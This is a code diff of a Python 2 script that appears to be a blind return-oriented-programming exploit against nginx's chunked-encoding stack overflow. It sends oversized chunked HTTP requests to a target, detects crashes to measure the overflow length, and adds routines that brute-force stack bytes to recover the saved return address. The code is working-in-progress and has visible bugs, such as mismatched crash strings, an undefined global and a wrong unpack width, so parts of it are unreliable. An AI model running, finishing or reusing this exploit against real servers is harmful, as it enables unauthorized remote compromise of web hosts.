@@ -1,6 +1,8 @@
 import sys
 import socket
 import argparse
+from time import sleep
+import struct
 
 overflow_len = 0
 
@@ -10,13 +12,12 @@ class Nginx:
 		self.port = port
 
 	def exploit(self,data):
-		sock = None
-		while sock == None:
-			sock = self.get_sock()
-		d = "A" * 4096
+		s = None
+		while s == None:
+			s = self.get_sock()
+		d = "A" * 4080
 		d += data
-		s.write(d)
-		s.flush() 
+		s.sendall(d)
 
 		alive = self.check_alive(s)
 
@@ -30,10 +31,10 @@ class Nginx:
         		"Connection: Keep-Alive\r\n"
         		"\r\n")
 
-		s.write(req)
+		s.sendall(req)
 
 		alive = self.check_alive(s)
-
+		s.close()
 		if not alive:
 			return "NO CRASH"
 		return "INFINITE LOOP"
@@ -41,36 +42,44 @@ class Nginx:
 	def check_alive(self,socket):
 		socket.setblocking(False)
 		for i in range(100):
-			x = s.recv
+			try:
+				x = socket.recv(1)
+			except:
+				return False
 			if len(x) == 0:
 				return False
+			sleep(0.01)
 		socket.setblocking(True)
 		return True
 	def get_sock(self):
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((self.ip,self.port))
-		size = "\xde\xad\xbe\xef\xde\xad\xbe\xef"
+		size = 200
 		req = ("GET / HTTP/1.1\r\n"
 				"Host: bla.com\r\n"
 				"Transfer-Encoding: Chunked\r\n"
 				"Connection: Keep-Alive\r\n"
 				"\r\n")
-		req += size +"\r\n"
+		req += str(size) +"\r\n"
 		s.send(req)
-		resp = s.recv()
+		resp = s.recv(4096)
 
-		if resp == None or "200 OK" not in resp:
+		if resp == None:
 			print "No response from server"
+			sys.exit(0)
+		headers = resp.split('\r\n')
+
+		if "200 OK" not in headers[0]:
+			print "Bad request to server:"
+			print headers[0]
 			sys.exit(0)
 
 		resp_len = 0
-		while True:
-			header = s.recv()
-			if "Content-Length: " in header:
-				resp_len = int(header.split()[1])
-			if header is "\r\n": 
-				break
-		s.rect(resp_len)
+		for h in headers:
+			if "Content-Length: " in h:
+				resp_len = int(h.split()[1])
+		if resp_len > 4096:
+			s.recv(resp_len)
 		return s
 
 def find_overflow_len(target):
@@ -95,10 +104,40 @@ def find_overflow_len(target):
 		if resp == "CRASH":
 			break
 		overflow_len+=1
-	return
 
 	overflow_len-=1
-	print "Found overflow length - is: " + str(overflow_len) + " bytes!"
+	print "Found overflow length - it is: " + str(overflow_len) + " bytes!"
+
+def find_rip(target):
+	words = []
+	while True:
+		payload = "A" * overflow_len
+		for word in words:
+			payload +=  struct.pack("<I",word)
+
+		w = stack_read_word(payload,target)
+		print "FOUND A WORD!"
+		break
+def stack_read_word(payload,target):
+	word = ""
+
+	for i in range(8):
+		w = stack_read_byte(payload,target)
+		if not w:
+			return None
+		word += w
+		payload += w
+	return struct.unpack("<I", word)
+
+def stack_read_byte(payload,target):
+	for i in range(256):
+		print i
+		s = payload
+		s += struct.pack("c",i)
+		r = nginx.exploit(s)
+		if r == "NOCRASH":
+			return i
+	return None
 
 def brop():
 	parser = argparse.ArgumentParser(description='Attempts to create an exploit given only a method to crash a remote service.')
@@ -107,6 +146,6 @@ def brop():
 	args = parser.parse_args()
 	nginx = Nginx(args.ip,args.p)
 	find_overflow_len(nginx)
-
+	find_rip(nginx)
 if __name__ == '__main__':
 	brop()
